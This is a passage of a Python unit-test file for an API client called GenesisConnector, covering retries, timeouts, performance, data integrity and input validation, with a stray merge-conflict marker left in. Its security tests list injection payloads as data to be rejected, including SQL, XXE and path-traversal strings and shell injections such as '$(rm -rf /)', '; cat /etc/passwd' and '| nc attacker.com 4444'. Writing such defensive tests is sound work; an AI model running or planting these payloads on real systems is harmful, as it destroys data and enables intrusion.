        ('key123with456numbers', True),
        ('UPPERCASE_KEY', True),
        ('MixedCase_Key', True),
        ('', False),
        ('key with spaces', True),  # Should work but not recommended
        ('key\nwith\nnewlines', True),  # Should work but not recommended
        ('key\twith\ttabs', True),  # Should work but not recommended
    ])
    def test_api_key_format_validation(self, api_key_format, should_work):
        """Test various API key formats."""
        config = {
            'api_key': api_key_format,
            'base_url': 'https://api.test.com',
            'timeout': 30,
            'max_retries': 3
        }

        if should_work and api_key_format:
            connector = GenesisConnector(config)
            assert connector.api_key == api_key_format
        else:
            with pytest.raises(ValueError):
                GenesisConnector(config)

    @pytest.mark.parametrize("retry_count,expected_calls", [
        (0, 1),  # No retries
        (1, 2),  # One retry
        (3, 4),  # Three retries
        (5, 6),  # Five retries
        (10, 11),  # Ten retries
    ])
    @patch('time.sleep')
    @patch('requests.Session.request')
    def test_retry_count_accuracy(self, mock_request, mock_sleep, connector, retry_count, expected_calls):
        """Test that retry count is accurate."""
        # Configure connector with specific retry count
        connector.max_retries = retry_count

        # Mock all requests to fail
        mock_request.side_effect = ConnectionError("Connection failed")

        with pytest.raises(GenesisConnectionError):
            connector.make_request('GET', '/test')

        # Verify correct number of calls
        assert mock_request.call_count == expected_calls
        assert mock_sleep.call_count == retry_count

    @pytest.mark.parametrize("timeout_value,expected_timeout", [
        (1, 1),
        (5, 5),
        (30, 30),
        (60, 60),
        (300, 300),
        (3600, 3600),
    ])
    @patch('requests.Session.request')
    def test_timeout_configuration(self, mock_request, timeout_value, expected_timeout):
        """Test timeout configuration with various values."""
        config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': timeout_value,
            'max_retries': 3
        }

        connector = GenesisConnector(config)

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        connector.make_request('GET', '/test')

        # Verify timeout was passed to request
        args, kwargs = mock_request.call_args
        assert kwargs['timeout'] == expected_timeout


class TestGenesisConnectorPerformanceBenchmarks(unittest.TestCase):
    """Performance benchmarking tests for GenesisConnector."""

    def setUp(self):
        """Set up performance test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @unittest.skipIf(not hasattr(unittest, 'skip'), reason="Performance tests can be skipped")
    @patch('requests.Session.request')
    def test_request_latency_measurement(self, mock_request):
        """Measure request latency under various conditions."""
        import time

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        # Measure single request latency
        start_time = time.time()
        result = self.connector.make_request('GET', '/test')
        end_time = time.time()

        latency = end_time - start_time

        # Should complete quickly (under 1 second for mocked request)
        self.assertLess(latency, 1.0)
        self.assertEqual(result, {'success': True})

    @patch('requests.Session.request')
    def test_throughput_measurement(self, mock_request):
        """Measure request throughput."""
        import time

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        num_requests = 100
        start_time = time.time()

        for i in range(num_requests):
            result = self.connector.make_request('GET', f'/test/{i}')
            self.assertEqual(result, {'success': True})

        end_time = time.time()
        total_time = end_time - start_time
        throughput = num_requests / total_time

        # Should achieve reasonable throughput (>50 requests per second for mocked)
        self.assertGreater(throughput, 50.0)

    @patch('requests.Session.request')
    def test_memory_efficiency(self, mock_request):
        """Test memory efficiency over many requests."""
        import gc
        import sys

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'x' * 1000}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        # Measure memory before
        gc.collect()
        initial_objects = len(gc.get_objects())

        # Make many requests
        for i in range(100):
            result = self.connector.make_request('GET', f'/test/{i}')
            self.assertIsNotNone(result)

        # Measure memory after
        gc.collect()
        final_objects = len(gc.get_objects())

        # Object count should not grow excessively
        object_growth = final_objects - initial_objects
        self.assertLess(object_growth, 1000)  # Reasonable threshold
>>>>>>> pr458merge


class TestGenesisConnectorAdvancedValidation(unittest.TestCase):
    """Additional comprehensive validation tests for GenesisConnector."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    def test_configuration_validation_with_nested_structures(self):
        """Test configuration validation with complex nested structures."""
        complex_configs = [
            {
                'api_key': 'test_key',
                'base_url': 'https://api.test.com',
                'timeout': 30,
                'max_retries': 3,
                'nested_config': {
                    'auth': {'type': 'bearer', 'refresh_enabled': True},
                    'retry_policy': {'exponential_backoff': True, 'max_delay': 60}
                }
            },
            {
                'api_key': 'test_key',
                'base_url': 'https://api.test.com',
                'advanced_settings': {
                    'connection_pool': {'size': 10, 'timeout': 5},
                    'compression': {'enabled': True, 'algorithm': 'gzip'},
                    'logging': {'level': 'DEBUG', 'format': 'json'}
                }
            }
        ]

        for config in complex_configs:
            with self.subTest(config=config):
                try:
                    connector = GenesisConnector(config)
                    self.assertIsNotNone(connector)
                except (ValueError, TypeError):
                    # Complex configs might be rejected depending on implementation
                    pass

    def test_url_validation_comprehensive(self):
        """Test comprehensive URL validation scenarios."""
        url_test_cases = [
            # Valid URLs
            ('https://api.example.com', True),
            ('https://api.example.com:8443', True),
            ('https://api.example.com/v1', True),
            ('https://sub.domain.example.com', True),
            ('https://api-staging.example.com', True),
            ('https://127.0.0.1:8080', True),
            ('https://[::1]:8080', True),  # IPv6
            
            # Invalid URLs
            ('http://insecure.example.com', False),  # Non-HTTPS
            ('ftp://ftp.example.com', False),  # Wrong protocol
            ('https://', False),  # Incomplete
            ('not_a_url', False),  # Not a URL
            ('https://example.com:99999', False),  # Invalid port
            ('https://example..com', False),  # Double dots
            ('https://exam ple.com', False),  # Spaces
            ('javascript:alert(1)', False),  # XSS attempt
        ]

        for url, should_be_valid in url_test_cases:
            with self.subTest(url=url):
                config = self.mock_config.copy()
                config['base_url'] = url

                if should_be_valid:
                    try:
                        connector = GenesisConnector(config)
                        self.assertIsNotNone(connector)
                    except ValueError:
                        self.fail(f"Valid URL {url} was rejected")
                else:
                    with self.assertRaises(ValueError):
                        GenesisConnector(config)

    def test_api_key_security_patterns(self):
        """Test API key validation for security patterns."""
        security_test_cases = [
            # Potentially insecure patterns
            ('password123', False),  # Common password
            ('123456', False),  # Weak numeric
            ('admin', False),  # Common username
            ('test', False),  # Test value
            ('key', False),  # Too simple
            ('api_key', False),  # Default value
            
            # Secure patterns
            ('sk_live_51H...' + 'x' * 20, True),  # Stripe-like
            ('xoxb-' + '1' * 50, True),  # Slack-like
            ('ghp_' + 'a' * 36, True),  # GitHub-like
            ('AIza' + 'B' * 35, True),  # Google-like
            ('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9', True),  # JWT-like
        ]

        for api_key, should_be_secure in security_test_cases:
            with self.subTest(api_key=api_key):
                config = self.mock_config.copy()
                config['api_key'] = api_key

                # Implementation might validate API key security
                try:
                    connector = GenesisConnector(config)
                    if not should_be_secure:
                        # Could warn about insecure keys
                        pass
                except ValueError as e:
                    if should_be_secure:
                        self.fail(f"Secure API key {api_key} was rejected: {e}")

    def test_timeout_boundary_conditions_extended(self):
        """Test extended timeout boundary conditions."""
        import sys
        
        timeout_test_cases = [
            # Boundary values
            (0.001, True),  # Very small positive
            (0.1, True),  # Small decimal
            (1, True),  # Minimum practical
            (30, True),  # Standard value
            (300, True),  # 5 minutes
            (3600, True),  # 1 hour
            (86400, True),  # 24 hours
            
            # Edge cases
            (sys.float_info.min, True),  # Smallest positive float
            (sys.float_info.max, False),  # Largest float (impractical)
            (float('inf'), False),  # Infinity
            (float('-inf'), False),  # Negative infinity
            (float('nan'), False),  # Not a number
            
            # Invalid types
            ('30', False),  # String
            ([30], False),  # List
            ({'timeout': 30}, False),  # Dict
            (None, False),  # None
        ]

        for timeout, should_be_valid in timeout_test_cases:
            with self.subTest(timeout=timeout):
                config = self.mock_config.copy()
                config['timeout'] = timeout

                if should_be_valid:
                    try:
                        connector = GenesisConnector(config)
                        self.assertEqual(connector.timeout, timeout)
                    except (ValueError, TypeError, OverflowError):
                        # Some edge cases might still be rejected
                        pass
                else:
                    with self.assertRaises((ValueError, TypeError, OverflowError)):
                        GenesisConnector(config)


class TestGenesisConnectorAdvancedErrorScenarios(unittest.TestCase):
    """Advanced error scenario testing for GenesisConnector."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('requests.Session.request')
    def test_intermittent_network_failures(self, mock_request):
        """Test handling of intermittent network failures."""
        # Simulate intermittent failures: fail, succeed, fail, succeed
        responses = []
        for i in range(10):
            if i % 2 == 0:  # Even indices fail
                responses.append(ConnectionError("Intermittent failure"))
            else:  # Odd indices succeed
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {'request': i}
                mock_response.raise_for_status.return_value = None
                responses.append(mock_response)

        mock_request.side_effect = responses

        successful_requests = 0
        failed_requests = 0

        for i in range(5):  # Try 5 requests
            try:
                result = self.connector.make_request('GET', f'/test/{i}')
                self.assertIsNotNone(result)
                successful_requests += 1
            except (GenesisConnectionError, GenesisTimeoutError):
                failed_requests += 1

        # Should have some mix of successes and failures
        self.assertGreater(successful_requests, 0)

    @patch('requests.Session.request')
    def test_cascading_timeout_scenarios(self, mock_request):
        """Test cascading timeout scenarios with different timeout types."""
        timeout_types = [
            requests.exceptions.ConnectTimeout("Connection timeout"),
            requests.exceptions.ReadTimeout("Read timeout"),
            Timeout("General timeout"),
            socket.timeout("Socket timeout"),
            asyncio.TimeoutError("Async timeout") if 'asyncio' in sys.modules else Timeout("Timeout")
        ]

        for timeout_error in timeout_types:
            with self.subTest(timeout_type=type(timeout_error).__name__):
                mock_request.side_effect = timeout_error

                with self.assertRaises(GenesisTimeoutError):
                    self.connector.make_request('GET', '/test')

                mock_request.reset_mock()

    @patch('requests.Session.request')
    def test_memory_pressure_scenarios(self, mock_request):
        """Test behavior under memory pressure conditions."""
        memory_errors = [
            MemoryError("Cannot allocate memory"),
            OSError("Cannot allocate memory"),
            # Simulate large response that might cause memory issues
        ]

        for error in memory_errors:
            with self.subTest(error_type=type(error).__name__):
                mock_request.side_effect = error

                with self.assertRaises((MemoryError, OSError)):
                    self.connector.make_request('GET', '/test')

                mock_request.reset_mock()

    @patch('requests.Session.request')
    def test_server_overload_scenarios(self, mock_request):
        """Test handling of server overload scenarios."""
        overload_responses = [
            (503, "Service Unavailable", {'Retry-After': '60'}),
            (504, "Gateway Timeout", {}),
            (502, "Bad Gateway", {}),
            (429, "Too Many Requests", {'Retry-After': '30', 'X-RateLimit-Reset': '3600'}),
            (507, "Insufficient Storage", {}),
            (509, "Bandwidth Limit Exceeded", {}),
        ]

        for status_code, status_text, headers in overload_responses:
            with self.subTest(status_code=status_code):
                mock_response = Mock()
                mock_response.status_code = status_code
                mock_response.text = status_text
                mock_response.headers = headers
                mock_response.raise_for_status.side_effect = requests.HTTPError(f"{status_code} {status_text}")
                mock_request.return_value = mock_response

                with self.assertRaises(GenesisConnectionError) as context:
                    self.connector.make_request('GET', '/test')

                self.assertIn(str(status_code), str(context.exception))
                mock_request.reset_mock()

    @patch('requests.Session.request')
    def test_response_corruption_scenarios(self, mock_request):
        """Test handling of corrupted response scenarios."""
        corruption_scenarios = [
            # Truncated JSON
            ('{"data": "test", "incom', json.JSONDecodeError),
            # Invalid UTF-8
            (b'\xff\xfe{"data": "test"}', UnicodeDecodeError),
            # Mixed encoding
            ('{"data": "test\udcff"}', ValueError),
            # Null bytes in response
            ('{"data": "test\x00"}', ValueError),
            # Extremely nested structure
            ('{"a":' * 1000 + '1' + '}' * 1000, ValueError),
        ]

        for corrupt_data, expected_error in corruption_scenarios:
            with self.subTest(corruption=str(corrupt_data)[:50]):
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.raise_for_status.return_value = None

                if isinstance(corrupt_data, bytes):
                    mock_response.content = corrupt_data
                    mock_response.json.side_effect = UnicodeDecodeError("utf-8", corrupt_data, 0, 1, "invalid")
                else:
                    mock_response.text = corrupt_data
                    if 'incom' in corrupt_data:
                        mock_response.json.side_effect = json.JSONDecodeError("Truncated", corrupt_data, len(corrupt_data))
                    else:
                        mock_response.json.side_effect = ValueError("Corrupted response")

                mock_request.return_value = mock_response

                with self.assertRaises(GenesisConnectionError):
                    self.connector.make_request('GET', '/test')

                mock_request.reset_mock()


class TestGenesisConnectorAdvancedSecurity(unittest.TestCase):
    """Advanced security testing for GenesisConnector."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    def test_injection_attack_prevention(self):
        """Test prevention of various injection attacks."""
        injection_payloads = [
            # SQL injection
            "'; DROP TABLE users; --",
            "admin'--",
            "admin'/*",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            
            # NoSQL injection
            "'; db.users.drop(); //",
            "{$ne: null}",
            "'; return true; //",
            
            # Command injection
            "; cat /etc/passwd",
            "`whoami`",
            "$(rm -rf /)",
            "&& curl evil.com",
            "| nc attacker.com 4444",
            
            # LDAP injection
            "*)(uid=*))(|(uid=*",
            "admin)(|(password=*))",
            
            # XML/XXE injection
            "<?xml version='1.0'?><!DOCTYPE xxe [<!ENTITY hack SYSTEM 'file:///etc/passwd'>]><root>&hack;</root>",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            
            # Script injection
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "vbscript:msgbox('xss')",
            "data:text/html,<script>alert(1)</script>",
        ]

        for payload in injection_payloads:
            with self.subTest(payload=payload[:50]):
                # Test in API key
                config = self.mock_config.copy()
                config['api_key'] = payload
                
                with self.assertRaises(ValueError):
                    GenesisConnector(config)

                # Test in base URL
                config = self.mock_config.copy()
                config['base_url'] = f"https://api.test.com/{payload}"
                
                with self.assertRaises(ValueError):
                    GenesisConnector(config)

    def test_cryptographic_validation(self):
        """Test cryptographic pattern validation in API keys."""
        crypto_patterns = [
            # Valid cryptographic patterns
            ('a' * 32, True),  # 32-char hex-like
            ('A' * 64, True),  # 64-char hex-like
            ('sk_live_' + 'x' * 50, True),  # Stripe-like with prefix
            ('xoxb-' + '1' * 48, True),  # Slack bot token
            ('ghp_' + 'A' * 36, True),  # GitHub personal access token
            ('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.' + 'x' * 50, True),  # JWT-like
            
            # Weak patterns that should be flagged
            ('123456', False),
            ('password', False),
            ('admin', False),
            ('test', False),
            ('key', False),
            ('secret', False),
            ('token', False),
            ('api_key', False),
            ('default', False),
        ]

        for key_pattern, should_be_strong in crypto_patterns:
            with self.subTest(pattern=key_pattern):
                config = self.mock_config.copy()
                config['api_key'] = key_pattern

                try:
                    connector = GenesisConnector(config)
                    # Connector created successfully
                    if not should_be_strong:
                        # Implementation might warn about weak keys
                        # This is acceptable behavior
                        pass
                except ValueError:
                    if should_be_strong:
                        self.fail(f"Strong pattern {key_pattern} was rejected")

    def test_header_injection_comprehensive(self):
        """Test comprehensive header injection prevention."""
        header_injection_vectors = [
            # CRLF injection
            "value\r\nX-Injected: malicious",
            "value\nX-Injected: malicious",
            "value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
            
            # Null byte injection
            "value\x00X-Injected: malicious",
            "value\x0aX-Injected: malicious",
            "value\x0dX-Injected: malicious",
            
            # Unicode injection
            "value\u000aX-Injected: malicious",
            "value\u000dX-Injected: malicious",
            "value\u2028X-Injected: malicious",  # Line separator
            "value\u2029X-Injected: malicious",  # Paragraph separator
            
            # Control character injection
            "value\x01X-Injected: malicious",
            "value\x7fX-Injected: malicious",
        ]

        for injection_vector in header_injection_vectors:
            with self.subTest(vector=injection_vector[:30]):
                headers = {'X-Custom-Header': injection_vector}
                
                # Should reject or sanitize malicious headers
                result = self.connector._build_headers(headers)
                
                # Verify injection was prevented
                if result and 'X-Custom-Header' in result:
                    header_value = result['X-Custom-Header']
                    self.assertNotIn('\r\n', header_value)
                    self.assertNotIn('\n', header_value)
                    self.assertNotIn('\r', header_value)
                    self.assertNotIn('\x00', header_value)

    def test_response_header_security(self):
        """Test security of response header handling."""
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy',
            'Permissions-Policy',
        ]

        # Test that security headers are recognized if present
        mock_response_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000',
            'Content-Security-Policy': "default-src 'self'",
        }

        # This test verifies the connector handles security headers appropriately
        # Implementation details may vary
        with patch('requests.Session.request') as mock_request:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.headers = mock_response_headers
            mock_response.json.return_value = {'data': 'test'}
            mock_response.raise_for_status.return_value = None
            mock_request.return_value = mock_response

            result = self.connector.make_request('GET', '/test')
            self.assertEqual(result, {'data': 'test'})

            # If the connector exposes response headers, verify they're preserved
            if hasattr(self.connector, 'last_response_headers'):
                for header in security_headers:
                    if header in mock_response_headers:
                        self.assertIn(header, self.connector.last_response_headers)


class TestGenesisConnectorAdvancedPerformance(unittest.TestCase):
    """Advanced performance testing for GenesisConnector."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('requests.Session.request')
    def test_connection_pooling_efficiency(self, mock_request):
        """Test connection pooling efficiency."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        # Verify session reuse
        initial_session = self.connector.session
        
        # Make multiple requests
        for i in range(10):
            result = self.connector.make_request('GET', f'/test/{i}')
            self.assertEqual(result, {'success': True})
            
            # Session should remain the same (connection pooling)
            self.assertIs(self.connector.session, initial_session)

    @patch('requests.Session.request')
    def test_large_payload_performance(self, mock_request):
        """Test performance with large payloads."""
        import time

        # Create large payload (1MB)
        large_payload = {
            'data': 'x' * (1024 * 1024),
            'metadata': {
                'chunks': ['chunk' + str(i) for i in range(1000)],
                'nested': {
                    'deep_data': {str(i): f'value_{i}' for i in range(100)}
                }
            }
        }

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'received': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        start_time = time.time()
        result = self.connector.make_request('POST', '/large', data=large_payload)
        end_time = time.time()

        # Should handle large payloads efficiently
        self.assertEqual(result, {'received': True})
        self.assertLess(end_time - start_time, 5.0)  # Should complete within 5 seconds

    @patch('requests.Session.request')
    def test_burst_request_handling(self, mock_request):
        """Test handling of burst requests."""
        import time
        import threading

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        results = []
        errors = []

        def make_burst_requests():
            """Make rapid requests in a thread."""
            for i in range(50):
                try:
                    result = self.connector.make_request('GET', f'/burst/{i}')
                    results.append(result)
                except Exception as e:
                    errors.append(e)

        # Create multiple threads for burst testing
        threads = []
        start_time = time.time()

        for i in range(5):
            thread = threading.Thread(target=make_burst_requests)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        end_time = time.time()

        # Should handle burst requests efficiently
        self.assertGreater(len(results), len(errors))
        self.assertLess(end_time - start_time, 10.0)  # Should complete within 10 seconds

    def test_memory_usage_patterns(self):
        """Test memory usage patterns over time."""
        import gc
        import weakref

        # Create multiple connector instances
        connectors = []
        weak_refs = []

        for i in range(50):
            config = self.mock_config.copy()
            config['api_key'] = f'test_key_{i}'
            
            connector = GenesisConnector(config)
            connectors.append(connector)
            weak_refs.append(weakref.ref(connector))

        # Force garbage collection
        gc.collect()

        # Clear strong references
        del connectors
        gc.collect()

        # Check that objects can be garbage collected
        alive_refs = sum(1 for ref in weak_refs if ref() is not None)
        
        # Some references might still be alive due to implementation details
        # but most should be collectable
        self.assertLess(alive_refs, 10)

    @patch('requests.Session.request')
    def test_response_streaming_performance(self, mock_request):
        """Test performance of streaming responses."""
        import time

        # Mock streaming response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {'Content-Length': '1048576'}  # 1MB
        mock_response.iter_content.return_value = [b'x' * 1024 for _ in range(1024)]  # 1KB chunks
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        start_time = time.time()
        
        # Test streaming if supported
        try:
            result = self.connector.make_request('GET', '/stream', stream=True)
            end_time = time.time()
            
            self.assertIsNotNone(result)
            self.assertLess(end_time - start_time, 2.0)  # Should be fast for streaming
        except (AttributeError, TypeError):
            # Streaming might not be implemented
            self.skipTest("Streaming not supported")


class TestGenesisConnectorDataIntegrity(unittest.TestCase):
    """Data integrity testing for GenesisConnector."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    def test_data_serialization_integrity(self):
        """Test data serialization maintains integrity."""
        complex_data_structures = [
            # Unicode and special characters
            {'message': 'Hello 世界! 🌍 Café naïve résumé'},
            
            # Nested structures
            {
                'level1': {
                    'level2': {
                        'level3': {
                            'data': [1, 2, 3, {'nested': True}],
                            'metadata': {'created': '2023-01-01T00:00:00Z'}
                        }
                    }
                }
            },
            
            # Mixed data types
            {
                'string': 'text',
                'integer': 42,
                'float': 3.14159,
                'boolean': True,
                'null': None,
                'array': [1, 'two', 3.0, True, None],
                'object': {'key': 'value'}
            },
            
            # Edge case values
            {
                'empty_string': '',
                'empty_array': [],
                'empty_object': {},
                'zero': 0,
                'false': False,
                'negative': -42,
                'large_number': 1234567890123456789
            },
            
            # Special numeric values
            {
                'small_float': 1e-10,
                'large_float': 1e10,
                'precision': 0.1 + 0.2,  # Floating point precision issue
            }
        ]

        for data in complex_data_structures:
            with self.subTest(data=str(data)[:100]):
                with patch('requests.Session.request') as mock_request:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = data
                    mock_response.raise_for_status.return_value = None
                    mock_request.return_value = mock_response

                    # Send data and verify it round-trips correctly
                    result = self.connector.make_request('POST', '/test', data=data)
                    
                    # Result should maintain data integrity
                    self.assertEqual(result, data)

    def test_encoding_preservation(self):
        """Test that various encodings are preserved correctly."""
        encoding_test_cases = [
            'Basic ASCII text',
            'UTF-8: café naïve résumé',
            'Cyrillic: Привет мир',
            'Arabic: مرحبا بالعالم',
            'Chinese: 你好世界',
            'Japanese: こんにちは世界',
            'Emoji: 🌍🚀💫⭐🎉',
            'Mathematical: ∑∞∫∆∇∂',
            'Arrows: ←→↑↓↔↕⇄⇅',
            'Mixed: ASCII + café + 测试 + 🚀 + Привет'
        ]

        for text in encoding_test_cases:
            with self.subTest(text=text):
                data = {'message': text, 'description': f'Testing: {text}'}
                
                with patch('requests.Session.request') as mock_request:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = data
                    mock_response.raise_for_status.return_value = None
                    mock_request.return_value = mock_response

                    result = self.connector.make_request('POST', '/test', data=data)
                    
                    # Encoding should be preserved
                    self.assertEqual(result['message'], text)
                    self.assertIn(text, result['description'])

    def test_numeric_precision_handling(self):
        """Test handling of numeric precision."""
        precision_test_cases = [
            0.1 + 0.2,  # Classic floating point issue
            1.0000000000000001,  # Near 1.0 with small difference
            9999999999999999.0,  # Large integer as float
            1e-15,  # Very small positive number
            1e15,   # Very large number
            -1e-15, # Very small negative number
            -1e15,  # Very large negative number
        ]

        for number in precision_test_cases:
            with self.subTest(number=number):
                data = {'precision_value': number, 'type': 'precision_test'}
                
                with patch('requests.Session.request') as mock_request:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = data
                    mock_response.raise_for_status.return_value = None
                    mock_request.return_value = mock_response

                    result = self.connector.make_request('POST', '/test', data=data)
                    
                    # Numeric precision should be maintained within reasonable bounds
                    if abs(number) > 1e-10:  # Skip very small numbers that might lose precision
                        self.assertAlmostEqual(result['precision_value'], number, places=10)

    def test_null_and_undefined_handling(self):
        """Test handling of null and undefined values."""
        null_test_cases = [
            {'explicit_null': None},
            {'mixed': {'some_value': 'text', 'null_value': None, 'number': 42}},
            {'nested_nulls': {'level1': {'level2': None, 'level3': {'value': None}}}},
            {'array_with_nulls': [1, None, 'text', None, True]},
        ]

        for data in null_test_cases:
            with self.subTest(data=data):
                with patch('requests.Session.request') as mock_request:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = data
                    mock_response.raise_for_status.return_value = None
                    mock_request.return_value = mock_response

                    result = self.connector.make_request('POST', '/test', data=data)
                    
                    # Null values should be preserved
                    self.assertEqual(result, data)


# Run the additional tests if this file is executed directly
if __name__ == '__main__':
    # Create a test suite with all the new test classes
    additional_test_classes = [
        TestGenesisConnectorAdvancedValidation,
        TestGenesisConnectorAdvancedErrorScenarios, 
        TestGenesisConnectorAdvancedSecurity,
        TestGenesisConnectorAdvancedPerformance,
        TestGenesisConnectorDataIntegrity
    ]
    
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    for test_class in additional_test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    print(f"\nAdditional tests completed:")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")

